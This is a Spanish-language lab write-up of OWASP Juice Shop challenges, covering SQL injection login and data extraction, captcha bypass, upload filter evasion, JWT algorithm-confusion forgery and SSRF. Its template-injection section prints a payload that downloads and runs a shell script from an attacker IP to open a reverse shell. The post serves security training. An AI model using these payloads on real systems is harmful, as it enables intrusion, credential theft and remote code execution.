---
title: Guía de Vulnerabilidades Juice Shop
date: 2024-11-26
categories: [Labs & CTF, Web Vulnerabilities]
tags: [pentesting, juice-shop, web-security]
---

Esta guía cubre diferentes vulnerabilidades encontradas en la aplicación Juice Shop, incluyendo inyecciones SQL, bypass de autenticación, y más.

## Admin Registration

Para dar contexto vamos a realizar una inyección SQL para acceder como la cuenta de administrador existente y recabar algunos datos.

```sql
' OR '1'='1
```

![Login SQL Injection](/assets/img/posts/juicyshop/1.png)
_Inyección SQL básica para acceso_

Una vez dentro de la cuenta de administrador necesitamos acceder al json donde se almacenan los datos de los usuarios. En la pestaña network dentro de las herramientas para developers de nuestro navegador podemos encontrar el archivo.

![JSON User Data](/assets/img/posts/juicyshop/2.png)
![JSON User Data Details](/assets/img/posts/juicyshop/x.png)
_Al hacer click en los detalles de las cuentas se cargan archivos JSON con los datos de usuario_

Como vemos en el json, en los parámetros que se mandan a la hora de crear un usuario hay uno que por defecto se añade y es el "role", que en el perfil de admin se establece como "admin" pero en otros usuarios indica "customer". Para modificarlo vamos a interceptar la petición y añadir el parámetro "role" a la petición.

![Request Intercepted](/assets/img/posts/juicyshop/3.png)
_Interceptamos la petición para crear una cuenta nueva_

Añadimos el parámetro "role" a la petición y como vemos se modifica haciendo la cuenta administrador.

## Database Schema

Para esta vulnerabilidad vamos a aprovechar el input de búsqueda dentro de la tienda. Como vemos es sencillamente un input para buscar productos en la web lo que posiblemente implique que haga una consulta a la base de datos y devuelva los resultados.

Para comprobar si es o no vulnerable vamos a provocar un error de sintaxis.

![Search Input](/assets/img/posts/juicyshop/4.png)
_Input de búsqueda vulnerable a SQLi_

Comprobamos cuantas columnas tiene la tabla de productos haciendo una consulta normal.

![Search](/assets/img/posts/juicyshop/5.png)

Observamos que cuenta con 9 columnas vamos a intentar inyectar un Union. Por como funciona sqlite aquí no incluimos la columna con "null" sino números.

Para esta parte vamos a encodear la consulta en URL para no tener problemas en la sintaxis.

```sql
' UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--
```

![URL Encoded Query](/assets/img/posts/juicyshop/6.png)
_Consulta URL encoded_

Como se trata de una base de datos sqlite tendremos que buscar información sobre cómo almacena los datos y cómo podemos llamarlos.

![sqlite](/assets/img/posts/juicyshop/7.png)
![URL Encoded Query](/assets/img/posts/juicyshop/8.png)
![response](/assets/img/posts/juicyshop/9.png)

## Multiple Likes (Captcha Bypass)

Para esta vulnerabilidad vamos a hacer uso del apartado feedback de la web. Aquí vamos a ver cómo de forma anónima vamos a poder crear un comentario sobre la web.

![Feedback Form](/assets/img/posts/juicyshop/10.png)
_Formulario de feedback con captcha_

Al rellenar el formulario vemos que cuenta con un captcha para evitar scripts de automatización para por ejemplo dejar malas reseñas pero si indagamos un poco más...

![burp-capture](/assets/img/posts/juicyshop/11.png)
_Vemos que los parámetros que se pasan son el id del captcha ya que habrá varios establecidos para que vayan cambiando, la solución del captcha, el comentario y la puntuación._

Para poder abusar de esto podemos bien hacerlo mediante burpsuite o con un script en python.

![Burp Intruder](/assets/img/posts/juicyshop/12.png)
_Configuración en Burp Suite para automatizar peticiones_

![python script](/assets/img/posts/juicyshop/13.png)
_En este trozo establecemos un array con algunos mensajes negativos para crear las reviews y estructuramos el encabezado de la petición que se realiza a la web copiandolo de la que hemos capturado en burpsuite._

![python script](/assets/img/posts/juicyshop/14.png)
_En esta sección introducimos los datos que manda la petición aunque en este caso cambié el captcha porque el anterior me estaba dando algún problema por lo que capturé algunas peticiones más de la web y cogí el captcha 0 que me funcionó correctamente. Indicamos que mande la petición en forma de post con la url, los headers y el json (datos) y que la respuesta que obtenga la devuelva en texto plano. Más abajo simplemente creamos una reiteración de la función tantas veces como elementos tenemos en el array de los mensajes por lo que serán 10 peticiones a 1 por segundo e imprime un poco el proceso._

Como resultado:

![python script result](/assets/img/posts/juicyshop/15.png)
![python script result](/assets/img/posts/juicyshop/16.png)

## Two Factor Authentication

Para este proceso vamos a necesitar ir a cualquier perfil que tengamos acceso y probar a crear una autenticación de doble factor.

![2FA Setup](/assets/img/posts/juicyshop/17.png)
_Configuración inicial de 2FA_

Dentro vamos a ir a las opciones de seguridad y crear un autenticador 2FA.

Vamos a necesitar exfiltrar de nuevo el esquema de la tabla usuarios de la base de datos para observar la existencia de un parámetro.

![users table](/assets/img/posts/juicyshop/18.png)
_Datos de la tabla users_

Si nos fijamos en los nombres de las columnas hay una que se llama "totpsecret" y estamos intentando conseguir el 2FA de un usuario, por lo que deducimos que si TOTP se trata de las siglas "time-based one-time password", pues "toptsecret" algo puede tener que ver.

```sql
' UNION SELECT id,email,totpsecret FROM users--
```

En la query que realizamos hacemos un union con los nombres de las columnas que nos interesan y el resto lo saltamos e indicamos que la base de datos de la que queremos los datos se llama users.

![TOTP Extract](/assets/img/posts/juicyshop/19.png)
_Extracción del secreto TOTP_

Teniendo el token del TOTP podemos hacer uso de una web para que genere los códigos 2FA de ese usuario.

![2FA Token Generator](/assets/img/posts/juicyshop/20.png)
_Generador de tokens 2FA_

## Upload Type

Primero vamos a hacer login con cualquier usuario del que tengamos acceso por ejemplo "wurstbrot" de la anterior vulnerabilidad.

![Upload Interface](/assets/img/posts/juicyshop/21.png)
_Interfaz de subida de archivos_

Parece que está filtrado para documentos pdf y archivos comprimidos zip. Pues vamos a modificar la extensión de la shell a ver si cuela y además lo capturamos con burpsuite a ver si podemos modificar la extensión en el aire.

![Upload Interface](/assets/img/posts/juicyshop/22.png)
_Interfaz de subida de archivos_

Por ahora lo ha aceptado por lo que vamos a modificar la extensión y eliminar el .zip y observamos que lo sube sin problema.

```
Content-Type: application/zip
...
shell.php.zip → shell.php
```

![Completed Upload](/assets/img/posts/juicyshop/23.png)

## Manipulate Basket

Para esta vulnerabilidad vamos a iniciar sesión como cualquier usuario menos administrador ya que nuestro objetivo es añadir a su cesta algún producto desde otra cuenta de usuario.

Si en burpsuite vamos al historial http vamos a ver como cada vez que se añade un producto se llama a dos api`s distintas.

![Basket API](/assets/img/posts/juicyshop/24.png)
_Petición a la API de cestas_

Dentro de la petición más abajo vemos como añade el id de producto 24 a la cesta con id 4 en cantidad de 1.

![peticiones](/assets/img/posts/juicyshop/25.png)

Investigando un poco vemos que se puede hacer un bypass dejando el id de la cesta original en 4 y luego añadir otro id de cesta para que se añada en esa sin que nos de error.

![Basket](/assets/img/posts/juicyshop/26.png)
![Basket](/assets/img/posts/juicyshop/27.png)
_producto añadido_

## Forged Signed JWT

En esta vulnerabilidad vamos a necesitar un token JSON, que es como un paquete digital de información.

Iniciamos sesión con cualquier usuario y si hemos prestado atención a la traza de peticiones que hace el cliente al servidor en las anteriores vulnerabilidades vemos que hay unas peticiones interesantes que preguntan "whoami".

![whoami](/assets/img/posts/juicyshop/28.png)
_Para ver más claramente antes de modificar nada lo que hace esta función en el navegador si abrimos el modo developer y vamos a la pestaña de network podemos ver que es lo que se le está pasando a "whoami" en forma de json._

![whoami](/assets/img/posts/juicyshop/29.png)

Básicamente es la identificación del usuario, es decir el token JSON que lo identifica dentro de todas las funciones de la web. Bueno pues si vamos a la petición http que realiza vamos a poder ver el token.

![whoami](/assets/img/posts/juicyshop/30.png)

Si buscamos información previa sobre cómo funciona un JWT encontramos una web donde tenemos tanto documentación como una aplicación para "decodificar" el contenido de este token.

![JWT Decoder](/assets/img/posts/juicyshop/31.png)
_Decodificación del token JWT_

Aquí vamos a modificar entonces el email a rsa_lord@juice-sh.op y el algoritmo de encriptación de RS256 a HS256.

RS256 (Firma RSA con SHA-256) es un algoritmo asimétrico que usa un par de claves pública/privada: el proveedor de identidad tiene una clave privada (secreta) que usa para generar la firma, y el consumidor del JWT recibe una clave pública para validar la firma. Como la clave pública, a diferencia de la privada, no necesita mantenerse segura, la mayoría de los proveedores de identidad la hacen fácilmente disponible para que los consumidores la obtengan y usen (normalmente a través de una URL de metadatos).

HS256 (HMAC con SHA-256), por otro lado, implica una combinación de una función hash y una (única) clave secreta que se comparte entre las dos partes para generar el hash que servirá como firma. Como se usa la misma clave tanto para generar la firma como para validarla, hay que tener cuidado para asegurar que la clave no se vea comprometida.

En este punto suponemos que realizando un ataque de web discovering encontramos un directorio llamado "encryptionkeys" donde se encuentra la llave RSA pública.

![RSA](/assets/img/posts/juicyshop/32.png)

Para crear la firma usamos una herramienta online de HMAC-SHA256 y la clave pública que encontramos en el directorio "encryptionkeys".

![JWT](/assets/img/posts/juicyshop/33.png)
_En texto plano debemos introducir los datos del token que teníamos de color rosado en la web anterior JWT sin la parte azul que pertenece a la firma. En la secret key introducimos el RSA public key. Marcamos como sha256 y que el encoder sea base64._

Esa llave la vamos a llevar a cyberchef para hacerla "URL safe".

![JWT](/assets/img/posts/juicyshop/34.png)
![JWT](/assets/img/posts/juicyshop/35.png)
_Es importante primero decodificar de base64 estándar y luego codificar a base64url safe. Copiamos la salida y la modificamos directamente en el token reemplazando la zona azul._

Ahora si podemos copiar el token y modificar la petición en burpsuite.

![JWT](/assets/img/posts/juicyshop/36.png)
![JWT](/assets/img/posts/juicyshop/37.png)

## Premium Paywall

Si nos fijamos bien en la anterior vulnerabilidad donde encontramos la clave pública RSA tenemos un archivo interesante más "premium.key".

![Premium](/assets/img/posts/juicyshop/38.png)
_Si usamos un poco de investigación eficaz podemos intentar deducir qué es esto. Primera parte: "1337133713371337" - 1337 repetido 4 veces, es un número significativo. Segunda parte: "EA99A61D92D2955B1E9285B55BF2AD42" - Parece ser un hash MD5 (por su longitud de 32 caracteres hexadecimales)_

Tras un rato dando vueltas sin rumbo y un poquito de ayuda podemos encontrar un comentario extraño en el código fuente de la página de score boards.

![Premium](/assets/img/posts/juicyshop/39.png)
![Premium](/assets/img/posts/juicyshop/40.png)
_Mensaje cifrado en el código fuente_

Teniendo este mensaje cifrado y con la llave que ya encontramos antes deducimos que se trata de un cifrado AES256 CBC por lo que podemos decodificarlo.

![Premium](/assets/img/posts/juicyshop/41.png)
_Si visitamos la URL se completa el reto_

## Server Side Template Injection

Es una vulnerabilidad que ocurre cuando un atacante puede inyectar código malicioso en una plantilla que luego se ejecuta en el servidor y ocurre cuando la entrada del usuario se inserta directamente en una plantilla. Por lo tanto hay que encontrar alguna página en la web que se base en plantillas, que en es la del perfil. En el apartado de nombre de usuario podemos introducir uno y este se muestra bajo la imagen del perfil.

![Template Injection](/assets/img/posts/juicyshop/42.png)
_Para saber si la plantilla es vulnerable o si usa una plantilla esto dependerá del tipo de motor que use y el lenguaje. En este caso ya sabemos que usa JS y el motor de plantillas es PUG_

![Template Injection](/assets/img/posts/juicyshop/43.png)
_Ahora en vez de usar el "malware" que está ahí en internet para este ctf vamos a crear el nuestro propio que no va a ser más que una shell reversa en bash_

```javascript
#{global.process.mainModule.require('child_process')
  .exec('wget http://192.168.93.131:8000/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && bash /tmp/shell.sh')}
```

En resumidas cuentas haciendo uso de JS indicamos que descargue el shell.sh de nuestra máquina kali (que está sirviendo el archivo por http usando python), lo mande a la carpeta tmp, le de permisos de administrador y luego lo ejecute. Teniendo esto listo y antes de introducir el payload en el parámetro vulnerable preparamos tanto el archivo para servir como la escucha en el puerto 5555.

![Template Injection](/assets/img/posts/juicyshop/44.png)
_Ahora si inyectamos el payload en el parámetro de username._

![Template Injection](/assets/img/posts/juicyshop/45.png)
_Listo tenemos acceso remoto a la máquina del servidor._

## Server Side Request Forgery

El concepto es llegar a acceder contenido oculto o no visible al usuario dentro del sistema de archivos del servidor. En este caso el parámetro vulnerable se trata de una imagen y está contenido dentro de una etiqueta IMG por lo que en principio no podremos ver contenido en texto plano o renderizar otra cosa que no sea img.

El funcionamiento del parámetro dentro de la web es un prompt donde podemos introducir una URL para establecer nuestra foto de perfil desde un link externo.

![SSRF Attack](/assets/img/posts/juicyshop/46.png)
_Si introducimos una url de alguna imagen e inspeccionamos el contenido de la página veremos que el servidor web de juicy hace un request a la url, descarga la imagen y la muestra._

![SSRF Attack](/assets/img/posts/juicyshop/47.png)
_Y tenemos acceso a esa URL_

![SSRF Attack](/assets/img/posts/juicyshop/48.png)

Tras una exhaustiva investigación he llegado a la conclusión de que el proceso que se realiza en el servidor es el siguiente:

- Al poner la URL externa comprueba si es una imagen directa, si es así la descarga, la renombra con el id del usuario y la almacena en "frontend/dist/frontend/assets/public/images/uploads"
- Sea lo que sea el contenido de la URL lo descarga, es decir que aunque nosotros sirvamos un documento txt, el servidor lo descarga y lo renombra y almacena como un userID.jpg

Con esto claro lo que podemos hacer es indicar direcciones de posibles archivos dentro del servidor para que realice esa copia en el directorio uploads y nosotros podamos descargarlo con un wget, por ejemplo:

![SSRF Attack](/assets/img/posts/juicyshop/49.png)
_En el servidor en el path de la ruta a la que se descargan sabemos que existe una carpeta private_

![SSRF Attack](/assets/img/posts/juicyshop/50.png)
_Podemos intentar hacer referencia a alguno de los archivos "js" que existen._

![SSRF Attack](/assets/img/posts/juicyshop/51.png)
_Ahora desde nuestra máquina podemos acceder al recurso, descargarlo y ver su contenido._

> A tener en cuenta es que el servidor por algún motivo que aún no entiendo solo encuentra archivos desde la ruta de assets y no podemos ir más atrás de ese directorio o al menos aún no lo he conseguido por lo que no podemos filtrar documentos del sistema por ahora. El servidor al no encontrar los archivos lo que hace es crear el userID.jpg con una plantilla html que tiene por defecto por lo que no sirve de nada.